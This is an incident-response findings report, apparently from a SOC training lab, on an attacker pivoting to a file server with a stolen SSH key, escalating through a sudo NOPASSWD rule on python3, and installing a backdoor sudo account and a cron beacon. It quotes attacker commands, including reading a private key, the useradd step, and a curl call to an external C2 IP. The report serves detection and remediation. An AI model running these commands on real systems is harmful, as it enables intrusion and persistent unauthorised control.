# INC-2026-003 Findings Report: Lateral Movement and Persistence

**Engagement:** NexaCorp DFIR, Lateral Movement and Persistence on lge-files-01
**Reference:** BCC-2026 / INC-2026-003
**Target system:** lge-files-01 (NexaCorp Liege file server, 192.168.10.30)
**Reported by:** Marc Wauters, IT Infrastructure Manager
**Date reported:** 2026-05-25
**Analyst:** Johan-Emmanuel Hatchi, SOC Analyst L1, BeCode Corp
**Classification:** Confidential

> Timezone note : timestamps are CEST (UTC+02:00) unless marked otherwise. The network capture is native UTC; both values are shown where it is cited.

---

## 1. Executive summary

On 24 May 2026, an attacker already established on the Brussels application server (`bru-app-01`, from INC-2026-002) pivoted to the Liege file server (`lge-files-01`) with no new exploit. Using a stolen `svc_api` SSH private key that was also authorised for the `svc_backup` account, the attacker logged in as `svc_backup`, escalated to root through a `sudo NOPASSWD` rule on the Python interpreter, and installed two persistence mechanisms : a backdoor administrator account (`sysupdate`) and a cron job that beacons to an external server every five minutes. The beacon was still active at the time of reporting.

The root cause is **SSH key reuse across service accounts** : a single private key opened a different account on a different host, so possession of one key granted access the attacker should never have had. This incident is the third of the Month 1 campaign ; the cross-incident picture (INC-2026-001 to 003 as a single operation) is presented in the [Month 1 Assessment Report](Month1_Assessment_Report.md).

---

## 2. Incident timeline

| Time (CEST) | Host / source | Event | Source |
|---|---|---|---|
| 12:31:08 | bru-app-01 | `it_support` (backdoor from INC-2026-002) logs in by password from 185.220.101.62 (Tor) | auth.log |
| 12:35:44 | bru-app-01 | `find /home /root -name id_rsa -o -name authorized_keys` : locates key material | auth.log |
| 12:36:19 | bru-app-01 | `cat /home/svc_api/.ssh/id_rsa` : reads the svc_api private key | auth.log |
| 12:36:51 | bru-app-01 | reads `svc_backup` authorized_keys : confirms the svc_api key authorises svc_backup | auth.log |
| 12:38:29 | bru-app-01 | `cp /home/svc_api/.ssh/id_rsa /tmp/.cache` : stages the stolen key | auth.log |
| 12:39:54 | lge-files-01 | Accepted publickey for `svc_backup` from 192.168.10.20 (bru-app-01), key fingerprint `SHA256:Cx3hNuyZt0jgbq25UKWg3kcSA0L9dfgL3OeCHXlJQg4` (the svc_api key, not the legitimate svc_backup key) | sshd_journal.log |
| 12:40:28 - 12:40:51 | lge-files-01 | Privilege escalation : audit records show auid=1000 (svc_backup) with euid=0 (root), key=`lab03_exec` | audit_filtered.log |
| 12:40:51 | lge-files-01 | Backdoor account created : `sudo python3 -c '...useradd sysupdate ... usermod -aG sudo sysupdate'` | sudo_journal.log |
| 12:41:00 | lge-files-01 | C2 cron installed : `/etc/cron.d/system-update` (`*/5`), beacon to 34.251.89.142 | sudo_journal.log |
| 12:45 - 13:00 (10:45 - 11:00 UTC) | lge-files-01 | Four outbound C2 beacons : `GET /update?h=lge-files-01` to 34.251.89.142:80 | pcap |
| 14:32 onward | lge-files-01 | Defender review of cron and accounts (post-incident) | sudo_journal.log |

---

## 3. Technical analysis

### 3.1 Finding 1 - Lateral movement via reused service-account SSH key (High)
- **Severity:** High
- **Finding type:** Lateral movement using a reused service-account SSH key
- **CWE:** CWE-522 (Insufficiently Protected Credentials), key reused across accounts
- **MITRE ATT&CK:** T1552.004 (Private Keys), T1021.004 (Remote Services: SSH), T1078 (Valid Accounts)
- **Affected scope:** lge-files-01 (192.168.10.30), account `svc_backup`

The attacker moved from `bru-app-01` (192.168.10.20) to `lge-files-01` using a stolen SSH private key. The connection at 12:39:54 authenticated as `svc_backup` but stands out against the baseline : legitimate `svc_backup` activity always originates from the monitoring server `mon-01` (192.168.10.200) and uses key fingerprint `SHA256:mHj4kL9pWqNv2rXsZt7uYa3oBc1dEf5gHi6jKl8mNo0`. The malicious connection comes from `bru-app-01` and presents a different key (`SHA256:Cx3hNuyZt0jgbq25UKWg3kcSA0L9dfgL3OeCHXlJQg4`) : the account and method match the legitimate service, the source and the key do not.

In the minutes before the pivot, the `it_support` backdoor account (from INC-2026-002) located key material (12:35:44), read the `svc_api` private key (12:36:19), confirmed it was authorised for `svc_backup` (12:36:51), and staged it (12:38:29). The attacker verified the key would open a `svc_backup` session before pivoting. **Root cause :** the public key for `svc_api`'s private key was present in `svc_backup`'s `authorized_keys` on lge-files-01 ; one key pair was reused across service accounts.

### 3.2 Finding 2 - Privilege escalation via sudo NOPASSWD on python3 (Critical)
- **Severity:** Critical
- **Finding type:** Local privilege escalation via sudo misconfiguration (GTFOBins)
- **CWE:** CWE-250 (Execution with Unnecessary Privileges), chained with CWE-269 (Improper Privilege Management)
- **MITRE ATT&CK:** T1548.003 (Sudo and Sudo Caching)
- **Affected scope:** lge-files-01, sudoers rule granting `svc_backup` NOPASSWD on `/usr/bin/python3`

The `svc_backup` account was permitted to run `/usr/bin/python3` via sudo without a password. Python is an interpreter : sudo on it means the account can run anything as root. The attacker used `python3 -c 'import os; os.system(...)'` to run commands inline as root without an interactive shell. The audit trail shows the escalation directly : session owner `auid=1000` (svc_backup) with `euid=0` (root), tagged `key="lab03_exec"`, at 12:40:28 and 12:40:51. This violates least privilege : a backup service account held unconstrained root, available to anyone who obtains the account.

### 3.3 Finding 3 - Persistence : backdoor account and active C2 cron (Critical)
- **Severity:** Critical (driven by the active C2 channel)
- **Finding type:** Two persistence mechanisms installed post-escalation
- **CWE:** CWE-269 (Improper Privilege Management), CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **MITRE ATT&CK:** T1136.001 (Create Account: Local Account), T1053.003 (Cron), T1071.001 (Application Layer Protocol: Web)
- **Affected scope:** lge-files-01 : account `sysupdate`, file `/etc/cron.d/system-update`

Within nine seconds the attacker installed two persistence mechanisms, both active at reporting :

- **Backdoor account (12:40:51).** `useradd sysupdate` with an attacker-set password (`[REDACTED-lab-credential]`), added to the `sudo` group : a standalone administrative login independent of the stolen key. Removal : `userdel -r sysupdate`, then verify against `/etc/passwd`, `/etc/shadow`, `/etc/group`.
- **C2 cron beacon (12:41:00).** `/etc/cron.d/system-update` runs every five minutes : `curl -s http://34.251.89.142/update?h=lge-files-01` and appends a marker to `/tmp/.update.log`, sending the hostname to the attacker. Four beacons were captured in the network traffic (12:45, 12:50, 12:55, 13:00 CEST), confirming the job fired and that outbound traffic was permitted (exfiltration over this channel was possible). Removal : `rm /etc/cron.d/system-update /tmp/.update.log` and block 34.251.89.142 outbound.

---

## 4. Impact

The attacker obtained root on a third internal NexaCorp server and established self-restoring persistence with an active command-and-control channel. No exfiltration of identifiable employee personal data was confirmed in this incident ; the impact is unauthorized root control, durable backdoor access, and an open C2 channel through which exfiltration would have been possible. Because the pivot used trusted internal credentials, any host trusting the same reused key material is potentially exposed.

---

## 5. Detection note

This is an assessment lab : forensic evidence only, with no live detection (Wazuh) validation phase for this incident, so no detection rules are delivered. The intrusion is nonetheless detectable behaviorally, and these are recommended as monitoring controls : a service-account SSH login from an unexpected source or with a non-baseline key fingerprint ; creation of a new local account added to `sudo` ; a new drop-in appearing in `/etc/cron.d/` ; and outbound connections from a server to an unrecognized external host.

---

## 6. Indicators of compromise

- Pivot source : 192.168.10.20 (bru-app-01, compromised in INC-2026-002)
- Tor exit used on bru-app-01 : 185.220.101.62
- Malicious key fingerprint accepted for svc_backup : `SHA256:Cx3hNuyZt0jgbq25UKWg3kcSA0L9dfgL3OeCHXlJQg4`
- Backdoor account : `sysupdate` (added to sudo group)
- Persistence file : `/etc/cron.d/system-update` ; beacon marker `/tmp/.update.log`
- External C2 : `34.251.89.142` (HTTP, `/update?h=lge-files-01`)
- Staged key : `/tmp/.cache` on bru-app-01

## 7. MITRE ATT&CK mapping

| Finding | Tactic | Technique ID | Technique Name |
|---|---|---|---|
| F1 | Credential Access | T1552.004 | Unsecured Credentials: Private Keys |
| F1 | Lateral Movement | T1021.004 | Remote Services: SSH |
| F1 | Defense Evasion / Initial Access | T1078 | Valid Accounts |
| F2 | Privilege Escalation | T1548.003 | Sudo and Sudo Caching |
| F3 | Persistence | T1136.001 | Create Account: Local Account |
| F3 | Persistence / Execution | T1053.003 | Scheduled Task/Job: Cron |
| F3 | Command and Control | T1071.001 | Application Layer Protocol: Web Protocols |

Framework : MITRE ATT&CK Enterprise v15.

## 8. Remediation

1. **Rotate all SSH keys and end key reuse.** No private key should authorise more than one account or host. This closes the lateral-movement vector (F1).
2. **Remove the persistence immediately.** Delete `sysupdate` and `/etc/cron.d/system-update`, remove `/tmp/.update.log`, and block 34.251.89.142 outbound (F3).
3. **Fix the sudo rule.** Remove `svc_backup`'s NOPASSWD on `/usr/bin/python3` ; grant least privilege, never sudo on an interpreter (F2).
4. **Add egress filtering** so a compromised host cannot beacon out, and **behavioural detection** for the signals in section 5.
5. **Treat the incident as not closed** until the backdoor account, cron job and reused keys are removed and verified, not only the entry path.

---

## 9. Conclusion

INC-2026-003 is a lateral-movement and persistence incident that required no new exploit : it succeeded because a reused SSH key was trusted across accounts and a service account held unconstrained sudo. The attacker took root on lge-files-01 and left a backdoor account and an active C2 cron. Removing the persistence, ending key reuse, and constraining sudo close this incident. For how it connects to INC-2026-001 and INC-2026-002 as one continuous operation, see the [Month 1 Assessment Report](Month1_Assessment_Report.md).
